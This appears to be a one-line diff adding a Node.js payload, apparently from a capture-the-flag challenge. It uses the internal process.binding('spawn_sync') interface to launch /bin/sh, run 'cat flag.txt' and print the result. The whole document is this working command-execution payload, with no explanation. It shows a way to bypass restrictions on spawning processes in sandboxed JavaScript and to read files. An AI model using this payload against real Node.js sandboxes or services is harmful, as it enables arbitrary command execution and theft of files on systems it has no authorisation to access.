@@ -1,0 +1,1 @@
+console.log(process.binding("spawn_sync").spawn({ shell: true, args: ["/bin/sh", "-c", "cat flag.txt"], file: "/bin/sh", stdio: [{ type: "pipe", readable: true, writable: false }, { type: "pipe", readable: false, writable: true }, { type: "pipe", readable: false, writable: true } ] }).output[1].toString());
